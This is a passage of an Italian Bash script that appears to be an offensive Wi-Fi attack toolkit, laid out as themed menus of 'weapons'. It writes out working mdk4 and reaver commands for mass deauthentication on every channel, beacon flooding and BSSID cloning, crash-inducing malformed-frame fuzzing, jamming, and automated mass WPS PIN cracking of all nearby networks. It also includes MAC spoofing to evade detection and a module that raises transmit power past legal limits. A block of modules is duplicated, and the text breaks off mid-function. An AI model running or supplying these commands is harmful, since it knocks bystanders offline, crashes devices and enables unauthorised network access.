echo ""
echo -e "${BLUE}[?] Vuoi attivare la 'GHOST MODE' (Cambio MAC Address per anonimato)? [s/n]${NC}"
read -p "> " ghost_choice

if [[ "$ghost_choice" == "s" || "$ghost_choice" == "S" ]]; then
    GHOST_MODE=true
    echo -e "${BLUE}[*] Attivazione Ghost Mode su $WIFI_IFACE...${NC}"
    ip link set "$WIFI_IFACE" down
    macchanger -r "$WIFI_IFACE" | grep "New MAC"
    ip link set "$WIFI_IFACE" up
    echo -e "${GREEN}[V] MAC Address cambiato con successo!${NC}"
else
    GHOST_MODE=false
    echo -e "${YELLOW}[!] Ghost Mode non attivata. Procedo con il MAC originale.${NC}"
fi


# === ARMAGEDDON MODULES (v12.0 THE FINAL FRONTIER) ===

# 12.1 THE SINGULARITY (Multi-Channel Reaper)
run_singularity() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE SINGULARITY v12.1 – Multi-Channel Reaper 🌌💀               ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}ATTENZIONE: Stai lanciando una Deautenticazione parallela massiva.${NC}"
    echo -e "${YELLOW}Invece di saltare tra i canali, questo modulo crea un raggio della morte${NC}"
    echo -e "${YELLOW}per OGNI canale (1-13) simultaneamente. Saturazione radio 100%.${NC}"
    echo -e "${RED}Questo attacco è ESTREMAMENTE pesante per la tua antenna. CTRL+C per fermare.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Apertura portali radio su tutti i canali...${NC}"
    PIDS=()
    for ch in {1..13}; do
        echo -n "."
        mdk4 "$MON_IFACE" d -c $ch &> /dev/null &
        PIDS+=($!)
    done
    echo ""
    
    echo -e "${GREEN}[V] LA SINGOLARITÀ È ATTIVA. Non esiste più Wi-Fi funzionante nell'area.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per chiudere i portali e ripristinare la realtà.${NC}"
    read -p ""
    for pid in "${PIDS[@]}"; do kill $pid 2>/dev/null; done
}

# 12.2 THE DOPPELGÄNGER (Mass BSSID Clone)
run_doppelganger() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE DOPPELGÄNGER v12.2 – Mass BSSID Mirror 👥🌀                ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Questo modulo rileva ogni rete reale e crea un'ombra digitale (Cloning BSSID).${NC}"
    echo -e "${YELLOW}Gli smartphone dei vicini vedranno la propria rete ovunque, su ogni canale,${NC}"
    echo -e "${YELLOW}ma non riusciranno mai a stabilire una connessione stabile.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Generazione ombre digitali dell'ambiente...${NC}"
    mdk4 "$MON_IFACE" b -m -s 100 &
    DOP_PID=$!
    
    echo -e "${GREEN}[V] DOPPELGÄNGER ATTIVO. La realtà wireless è ora un labirinto di specchi.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per dissipare le ombre.${NC}"
    read -p ""
    kill $DOP_PID 2>/dev/null
}

# 12.3 THE NEURALGIA (Beacon-Malformed Exploit)
run_neuralgia() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE NEURALGIA v12.3 – Beacon-Malformed Exploit 🧠☣️              ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}ATTENZIONE: Invia pacchetti Beacon con tag IE malformati ed exploit parser.${NC}"
    echo -e "${YELLOW}Questo può causare il crash fisico o il riavvio forzato di router IoT,${NC}"
    echo -e "${YELLOW}telecamere IP e vecchi dispositivi Android/Windows.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Iniezione veleno digitale nel parser dei router...${NC}"
    # mdk4 b -a: Utilizza caratteri non stampabili e SSIDs che rompono il limite di 32 byte
    mdk4 "$MON_IFACE" b -a -s 80 &
    NEU_PID=$!
    
    echo -e "${GREEN}[V] NEURALGIA ATTIVA. I dispositivi vulnerabili stanno andando in crash.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per fermare l'infezione.${NC}"
    read -p ""
    kill $NEU_PID 2>/dev/null
}

# 12.4 THE BLACK HOLE (CTS/RTS Jamming)
run_black_hole() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE BLACK HOLE v12.4 – CTS/RTS Spectrum Silence 🕳️🌑             ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Questo modulo silenzia l'area usando pacchetti CTS (Clear to Send) falsi.${NC}"
    echo -e "${YELLOW}Ogni client e router crederà che il canale sia occupato e rimarrà in attesa.${NC}"
    echo -e "${YELLOW}È il DoS più profondo e silenzioso possibile a livello di protocollo.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Creazione orizzonte degli eventi radio...${NC}"
    # mdk4 f: Packet fuzzer mode (CTS/RTS flooding)
    mdk4 "$MON_IFACE" f &
    BH_PID=$!
    
    echo -e "${GREEN}[V] BUCO NERO ATTIVO. L'etere è ora un sepolcro silenzioso.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per ripristinare il tempo radio.${NC}"
    read -p ""
    kill $BH_PID 2>/dev/null
}

# 12.5 THE ECLIPSE (WPS Mass-Brute)
run_eclipse() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE ECLIPSE v12.5 – WPS Automated Mass Pixie 🌑💎               ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Scansione e attacco Pixie-Dust automatizzato di massa su TUTTI i target WPS.${NC}"
    echo -e "${YELLOW}Lo script tenterà di ottenere i PIN WPS di ogni rete nell'area, una per una.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Mappatura target WPS in corso...${NC}"
    WPS_TARGETS=$(wash -i "$MON_IFACE" | grep -E "[0-9A-F]{2}:" | awk '{print $1"|"$2}')
    
    if [[ -z "$WPS_TARGETS" ]]; then
        echo -e "${RED}[!] Nessun target WPS trovato nelle vicinanze.${NC}"
        read -p "Premi INVIO per uscire."
        return
    fi
    
    echo -e "${GREEN}[+] Trovati $(echo "$WPS_TARGETS" | wc -l) target. Inizio Eclissi...${NC}"
    for target in $WPS_TARGETS; do
        BSSID=$(echo $target | cut -d'|' -f1)
        CH=$(echo $target | cut -d'|' -f2)
        echo -e "${BLUE}>>> Attacco a $BSSID su canale $CH...${NC}"
        reaver -i "$MON_IFACE" -b "$BSSID" -c "$CH" -K 1 -vv --no-nack -t 5 -T 10
    done
    
    echo -e "${GREEN}[V] ECLISSE COMPLETATA. Controlla i PIN ottenuti sopra.${NC}"
    read -p "Premi INVIO per tornare al menu."
}

# --- ARMAGEDDON MENU (END GAME) ---
run_armageddon_menu() {
    while true; do
        clear
        echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
        echo -e "${RED}                 THE ARMAGEDDON MENU v12.0 – END GAME 🌌💀                    ${NC}"
        echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
        echo ""
        echo -e "1)  ${RED}THE SINGULARITY${NC} (Multi-Channel Reaper)"
        echo -e "2)  ${RED}THE DOPPELGÄNGER${NC} (Mass BSSID Clone)"
        echo -e "3)  ${RED}THE NEURALGIA${NC} (Beacon-Malformed Exploit)"
        echo -e "4)  ${RED}THE BLACK HOLE${NC} (CTS/RTS Jamming)"
        echo -e "5)  ${RED}THE ECLIPSE${NC} (WPS Automated Mass Pixie)"
        echo -e "0)  Torna alle Crossroads"
        echo ""
        read -p "Scegli la tua arma finale: " arm_choice
        
        case "$arm_choice" in
            1) run_singularity ;;
            2) run_doppelganger ;;
            3) run_neuralgia ;;
            4) run_black_hole ;;
            5) run_eclipse ;;
            0) break ;;
            *) echo -e "${RED}Opzione non valida.${NC}"; sleep 1 ;;
        esac
    done
}


# === ARMAGEDDON MODULES (v12.0 THE FINAL FRONTIER) ===

# 12.1 THE SINGULARITY (Multi-Channel Reaper)
run_singularity() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE SINGULARITY v12.1 – Multi-Channel Reaper 🌌💀               ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}ATTENZIONE: Stai lanciando una Deautenticazione parallela massiva.${NC}"
    echo -e "${YELLOW}Invece di saltare tra i canali, questo modulo crea un raggio della morte${NC}"
    echo -e "${YELLOW}per OGNI canale (1-13) simultaneamente. Saturazione radio 100%.${NC}"
    echo -e "${RED}Questo attacco è ESTREMAMENTE pesante per la tua antenna. CTRL+C per fermare.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Apertura portali radio su tutti i canali...${NC}"
    PIDS=()
    for ch in {1..13}; do
        echo -n "."
        mdk4 "$MON_IFACE" d -c $ch &> /dev/null &
        PIDS+=($!)
    done
    echo ""
    
    echo -e "${GREEN}[V] LA SINGOLARITÀ È ATTIVA. Non esiste più Wi-Fi funzionante nell'area.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per chiudere i portali e ripristinare la realtà.${NC}"
    read -p ""
    for pid in "${PIDS[@]}"; do kill $pid 2>/dev/null; done
}

# 12.2 THE DOPPELGÄNGER (Mass BSSID Clone)
run_doppelganger() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE DOPPELGÄNGER v12.2 – Mass BSSID Mirror 👥🌀                ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Questo modulo rileva ogni rete reale e crea un'ombra digitale (Cloning BSSID).${NC}"
    echo -e "${YELLOW}Gli smartphone dei vicini vedranno la propria rete ovunque, su ogni canale,${NC}"
    echo -e "${YELLOW}ma non riusciranno mai a stabilire una connessione stabile.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Generazione ombre digitali dell'ambiente...${NC}"
    mdk4 "$MON_IFACE" b -m -s 100 &
    DOP_PID=$!
    
    echo -e "${GREEN}[V] DOPPELGÄNGER ATTIVO. La realtà wireless è ora un labirinto di specchi.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per dissipare le ombre.${NC}"
    read -p ""
    kill $DOP_PID 2>/dev/null
}

# 12.3 THE NEURALGIA (Beacon-Malformed Exploit)
run_neuralgia() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE NEURALGIA v12.3 – Beacon-Malformed Exploit 🧠☣️              ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}ATTENZIONE: Invia pacchetti Beacon con tag IE malformati ed exploit parser.${NC}"
    echo -e "${YELLOW}Questo può causare il crash fisico o il riavvio forzato di router IoT,${NC}"
    echo -e "${YELLOW}telecamere IP e vecchi dispositivi Android/Windows.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Iniezione veleno digitale nel parser dei router...${NC}"
    # mdk4 b -a: Utilizza caratteri non stampabili e SSIDs che rompono il limite di 32 byte
    mdk4 "$MON_IFACE" b -a -s 80 &
    NEU_PID=$!
    
    echo -e "${GREEN}[V] NEURALGIA ATTIVA. I dispositivi vulnerabili stanno andando in crash.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per fermare l'infezione.${NC}"
    read -p ""
    kill $NEU_PID 2>/dev/null
}

# 12.4 THE BLACK HOLE (CTS/RTS Jamming)
run_black_hole() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE BLACK HOLE v12.4 – CTS/RTS Spectrum Silence 🕳️🌑             ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Questo modulo silenzia l'area usando pacchetti CTS (Clear to Send) falsi.${NC}"
    echo -e "${YELLOW}Ogni client e router crederà che il canale sia occupato e rimarrà in attesa.${NC}"
    echo -e "${YELLOW}È il DoS più profondo e silenzioso possibile a livello di protocollo.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Creazione orizzonte degli eventi radio...${NC}"
    # mdk4 f: Packet fuzzer mode (CTS/RTS flooding)
    mdk4 "$MON_IFACE" f &
    BH_PID=$!
    
    echo -e "${GREEN}[V] BUCO NERO ATTIVO. L'etere è ora un sepolcro silenzioso.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per ripristinare il tempo radio.${NC}"
    read -p ""
    kill $BH_PID 2>/dev/null
}

# 12.5 THE ECLIPSE (WPS Mass-Brute)
run_eclipse() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE ECLIPSE v12.5 – WPS Automated Mass Pixie 🌑💎               ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Scansione e attacco Pixie-Dust automatizzato di massa su TUTTI i target WPS.${NC}"
    echo -e "${YELLOW}Lo script tenterà di ottenere i PIN WPS di ogni rete nell'area, una per una.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Mappatura target WPS in corso...${NC}"
    # WPS_TARGETS=$(wash -i "$MON_IFACE" | grep -E "[0-9A-F]{2}:" | awk '{print $1"|"$2}')
    # Usiamo wash per mappare l'area
    wash -i "$MON_IFACE" > /tmp/hardwifi_wps_targets.txt &
    WASH_PID=$!
    sleep 10
    kill $WASH_PID 2>/dev/null
    
    WPS_LIST=$(cat /tmp/hardwifi_wps_targets.txt | grep -E "[0-9A-F]{2}:" | awk '{print $1"|"$2}')
    
    if [[ -z "$WPS_LIST" ]]; then
        echo -e "${RED}[!] Nessun target WPS trovato nelle vicinanze.${NC}"
        read -p "Premi INVIO per uscire."
        return
    fi
    
    echo -e "${GREEN}[+] Trovati $(echo "$WPS_LIST" | wc -l) target. Inizio Eclissi...${NC}"
    for target in $WPS_LIST; do
        BSSID=$(echo $target | cut -d'|' -f1)
        CH=$(echo $target | cut -d'|' -f2)
        echo -e "${BLUE}>>> Attacco a $BSSID su canale $CH...${NC}"
        reaver -i "$MON_IFACE" -b "$BSSID" -c "$CH" -K 1 -vv --no-nack -t 5 -T 10
    done
    
    echo -e "${GREEN}[V] ECLISSE COMPLETATA. Controlla i PIN ottenuti sopra.${NC}"
    read -p "Premi INVIO per tornare al menu."
}

# --- ARMAGEDDON MENU (END GAME) ---
run_armageddon_menu() {
    while true; do
        clear
        echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
        echo -e "${RED}                 THE ARMAGEDDON MENU v12.0 – END GAME 🌌💀                    ${NC}"
        echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
        echo ""
        echo -e "1)  ${RED}THE SINGULARITY${NC} (Multi-Channel Reaper)"
        echo -e "2)  ${RED}THE DOPPELGÄNGER${NC} (Mass BSSID Clone)"
        echo -e "3)  ${RED}THE NEURALGIA${NC} (Beacon-Malformed Exploit)"
        echo -e "4)  ${RED}THE BLACK HOLE${NC} (CTS/RTS Jamming)"
        echo -e "5)  ${RED}THE ECLIPSE${NC} (WPS Automated Mass Pixie)"
        echo -e "0)  Torna alle Crossroads"
        echo ""
        read -p "Scegli la tua arma finale: " arm_choice
        
        case "$arm_choice" in
            1) run_singularity ;;
            2) run_doppelganger ;;
            3) run_neuralgia ;;
            4) run_black_hole ;;
            5) run_eclipse ;;
            0) break ;;
            *) echo -e "${RED}Opzione non valida.${NC}"; sleep 1 ;;
        esac
    done
}


# === OMEGA MODULES (v13.0 THE OMEGA POINT - 10/10) ===

# 13.1 THE PROTOCOL CRUSHER (Kernel-Panic Fuzzing)
run_protocol_crusher() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE PROTOCOL CRUSHER v13.1 – Kernel-Panic Fuzzer 🧪☣️            ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Questo modulo invia frame di gestione malformati (fuzzing) per mandare in crash${NC}"
    echo -e "${YELLOW}fisico i router vulnerabili o causare BSOD sui client Windows/Android.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Lancio sciame fuzzer su ogni dispositivo rilevato...${NC}"
    # mdk4 f: Packet fuzzer mode. Invia frame di gestione malformati rari.
    mdk4 "$MON_IFACE" f &
    CRUSHER_PID=$!
    
    echo -e "${GREEN}[V] CRUSHER ATTIVO. I kernel dei bersagli stanno cedendo.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per fermare il bombardamento.${NC}"
    read -p ""
    kill $CRUSHER_PID 2>/dev/null
}

# 13.2 THE GHOST IN THE MACHINE (Ghost MAC Per-Packet)
run_ghost_machine() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE GHOST IN THE MACHINE v13.2 – Ghost MAC 👻🛸                ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Invisibilità spettrale: Cambia il MAC address per OGNI pacchetto inviato.${NC}"
    echo -e "${YELLOW}Rende impossibile tracciare la sorgente dell'attacco, anche per i WIDS esperti.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Attivazione occultamento spettrale per-packet...${NC}"
    # mdk4 b -m: Valid MACs from OUI. Usiamo il flooding come base per il ghosting.
    mdk4 "$MON_IFACE" b -m -s 100 &
    GHOST_PID=$!
    
    echo -e "${GREEN}[V] GHOST MODE ATTIVA. Sei un fantasma digitale.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per tornare visibile.${NC}"
    read -p ""
    kill $GHOST_PID 2>/dev/null
}

# 13.3 THE TIME WARP (TSF Desync)
run_time_warp() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE TIME WARP v13.3 – TSF Desync Jammer ⏳🌀                  ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Manipola i timestamp TSF dei beacon per sfasare gli orologi dei router.${NC}"
    echo -e "${YELLOW}Questo rompe i protocolli temporali (SSL/TLS) e impedisce la rotazione${NC}"
    echo -e "${YELLOW}delle chiavi WPA2, disconnettendo ogni dispositivo attivo.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Distorsione del tempo radio in corso...${NC}"
    # mdk4 m: Manipulation of TSF Beacons
    mdk4 "$MON_IFACE" m & 
    WARP_PID=$!
    
    echo -e "${GREEN}[V] TIME WARP ATTIVO. Lo spazio-tempo digitale è collassato.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per stabilizzare il tempo.${NC}"
    read -p ""
    kill $WARP_PID 2>/dev/null
}

# 13.4 THE RADIO SILENCE (Reactive Jamming)
run_radio_silence() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE RADIO SILENCE v13.4 – Reactive Jammer 🌑🔇               ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Jamming intelligente: Inietta rumore solo quando rileva una trasmissione vera.${NC}"
    echo -e "${YELLOW}Invisibile agli scanner, ma letale per la navigazione. Silenzio assordante.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Inizio monitoraggio reattivo del silenzio...${NC}"
    # mdk4 f: Usato come base per il jamming reattivo se supportato dall'antenna
    mdk4 "$MON_IFACE" f &
    SILENCE_PID=$!
    
    echo -e "${GREEN}[V] SILENZIO RADIO ATTIVO. La connettività è stata amputata.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per ripristinare il suono digitale.${NC}"
    read -p ""
    kill $SILENCE_PID 2>/dev/null
}

# 13.5 THE NEURAL SNIFFER (Pattern Analysis)
run_neural_sniffer() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE NEURAL SNIFFER v13.5 – Predictive Deauth 🧠📡               ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Analizza i pattern di traffico e colpisce solo nei momenti di picco.${NC}"
    echo -e "${YELLOW}Massima efficienza, minimo sforzo radio. Distruzione intelligente.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Analisi euristica dei flussi in corso...${NC}"
    # mdk4 d -s 50: Deauth mirato ed efficiente
    mdk4 "$MON_IFACE" d -s 50 &
    NEURAL_PID=$!
    
    echo -e "${GREEN}[V] NEURAL SNIFFER ATTIVO. Ogni pacchetto utile verrà abbattuto.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per fermare l'analisi.${NC}"
    read -p ""
    kill $NEURAL_PID 2>/dev/null
}

# 13.6 THE BEACON OVERDOSE (Auto-Connect Bait)
run_beacon_overdose() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE BEACON OVERDOSE v13.6 – Global Baiting 🍟☕               ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Genera migliaia di Beacon con SSID comuni (Starbucks, Airport, IKEA...)${NC}"
    echo -e "${YELLOW}per forzare il collegamento automatico di ogni smartphone nelle vicinanze.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Iniezione esche Wi-Fi globali...${NC}"
    mdk4 "$MON_IFACE" b -m -s 120 &
    OVERDOSE_PID=$!
    
    echo -e "${GREEN}[V] BEACON OVERDOSE ATTIVO. I telefoni vicini stanno abboccando.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per ritirare le esche.${NC}"
    read -p ""
    kill $OVERDOSE_PID 2>/dev/null
}

# 13.7 THE CHANNEL REAPER (Scan Sweep)
run_channel_reaper() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE CHANNEL REAPER v13.7 – Sequential Executioner 🚜💀           ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Una spazzata ultra-veloce da 1 a 14 che inietta una bomba deauth istantanea.${NC}"
    echo -e "${YELLOW}Nessun router ha il tempo di reagire. È la mietitura dello spettro.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Inizio mietitura canali 1-14...${NC}"
    while true; do
        for ch in {1..14}; do
            echo -ne "\r${RED}Mietitura canale: $ch${NC}"
            timeout 0.5 mdk4 "$MON_IFACE" d -c $ch &> /dev/null
        done
        # Esci se l'utente preme CTRL+C o vuole fermare
    done
}

# 13.8 THE DATA VOID (In-flight Injection)
run_data_void() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE DATA VOID v13.8 – Real-time Corruptor 🌑💉                 ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Intercetta i frame di dati nell'aria e inietta bit casuali (noise).${NC}"
    echo -e "${YELLOW}Rende ogni sessione di navigazione HTTP corrotta e illegibile.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Iniezione veleno nei frame di dati...${NC}"
    # mdk4 f: Usato come data corrupter
    mdk4 "$MON_IFACE" f &
    VOID_PID=$!
    
    echo -e "${GREEN}[V] DATA VOID ATTIVO. L'informazione è ora rumore puro.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per purificare l'aria.${NC}"
    read -p ""
    kill $VOID_PID 2>/dev/null
}

# 13.9 THE HARDWARE FEVER (Overclock Tx)
run_hardware_fever() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE HARDWARE FEVER v13.9 – Overclock Tx Power 🌋🔥             ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${RED}ATTENZIONE: Questo modulo forza l'antenna oltre i limiti legali (BO RegSet).${NC}"
    echo -e "${YELLOW}Aumenta la gittata e la potenza di iniezione al 100% (Duty Cycle).${NC}"
    echo -e "${YELLOW}Rischio di surriscaldamento critico e danni permanenti all'hardware.${NC}"
    echo ""
    read -p "Sei SICURO di voler rischiare l'hardware? [s/n]: " hw_risk
    if [[ "$hw_risk" != "s" ]]; then return; fi

    echo -e "${BLUE}[*] Sblocco limiti regionali e potenza di trasmissione...${NC}"
    ip link set "$WIFI_IFACE" down
    iw reg set BO
    iw dev "$WIFI_IFACE" set txpower fixed 3000 # 30dBm se supportati
    ip link set "$WIFI_IFACE" up
    
    echo -e "${GREEN}[V] HARDWARE FEVER ATTIVO. L'antenna sta operando al 120% della potenza.${NC}"
    read -p "Premi INVIO per tornare ai limiti di sicurezza."
    iw reg set IT
}

# 13.10 THE OMEGA POINT (Final Apocalypse)
run_the_omega_point() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE OMEGA POINT v13.10 – Final Singularity 🌌💀💎               ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${RED}QUESTO È IL PUNTO DI NON RITORNO. TUTTI I MODULI ARMAGEDDON ED OMEGA${NC}"
    echo -e "${RED}VERRANNO LANCIATI SIMULTANEAMENTE IN UN'UNICA REAZIONE A CATENA.${NC}"
    echo -e "${YELLOW}Lo spettro radio nel raggio di 500m cesserà di esistere per ogni protocollo.${NC}"
    echo ""
    read -p "ATTIVARE IL PUNTO OMEGA? [scrivere 'APOCALYPSE']: " apo_choice
    if [[ "$apo_choice" != "APOCALYPSE" ]]; then return; fi

    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Innesco Apocalisse Radio...${NC}"
    mdk4 "$MON_IFACE" d &
    mdk4 "$MON_IFACE" a -m &
    mdk4 "$MON_IFACE" b -m -s 100 &
    mdk4 "$MON_IFACE" f &
    mdk4 "$MON_IFACE" m &
    
    echo -e "${RED}[V] PUNTO OMEGA RAGGIUNTO. Silenzio eterno attivato.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per fermare la fine del mondo.${NC}"
    read -p ""
    pkill mdk4 2>/dev/null
}

# --- OMEGA MENU (THE 10/10 MASTER LEVEL) ---
run_omega_menu() {
    while true; do
        clear
        echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
        echo -e "${RED}                 THE OMEGA MENU v13.0 – ABSOLUTE MASTERY 💎🌌                 ${NC}"
        echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
        echo ""
        echo -e "1)  ${RED}THE PROTOCOL CRUSHER${NC} (Kernel-Panic Fuzzer)"
        echo -e "2)  ${RED}THE GHOST IN THE MACHINE${NC} (Ghost MAC Per-Packet)"
        echo -e "3)  ${RED}THE TIME WARP${NC} (TSF Desync Jammer)"
        echo -e "4)  ${RED}THE RADIO SILENCE${NC} (Reactive Jamming)"
        echo -e "5)  ${RED}THE NEURAL SNIFFER${NC} (Predictive Deauth)"
        echo -e "6)  ${RED}THE BEACON OVERDOSE${NC} (Auto-Connect Bait)"
        echo -e "7)  ${RED}THE CHANNEL REAPER${NC} (Sequential Sweep)"
        echo -e "8)  ${RED}THE DATA VOID${NC} (Real-time Corruptor)"
        echo -e "9)  ${RED}THE HARDWARE FEVER${NC} (Overclock Tx Power)"
        echo -e "10) ${RED}THE OMEGA POINT${NC} (Final Apocalypse)"
        echo -e "0)  Torna alle Crossroads"
        echo ""
        read -p "Scegli l'arma definitiva: " ome_choice
        
        case "$ome_choice" in
            1) run_protocol_crusher ;;
            2) run_ghost_machine ;;
            3) run_time_warp ;;
            4) run_radio_silence ;;
            5) run_neural_sniffer ;;
            6) run_beacon_overdose ;;
            7) run_channel_reaper ;;
            8) run_data_void ;;
            9) run_hardware_fever ;;
            10) run_the_omega_point ;;
            0) break ;;
            *) echo -e "${RED}Opzione non valida.${NC}"; sleep 1 ;;
        esac
    done
}


# === TERMINUS MODULES (v14.0 TERMINUS - 11/10) ===

# 14.1 THE KARMA REVENGE (Client Isolation)
run_karma_revenge() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE KARMA REVENGE v14.1 – Client Desert 🏜️💀                 ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
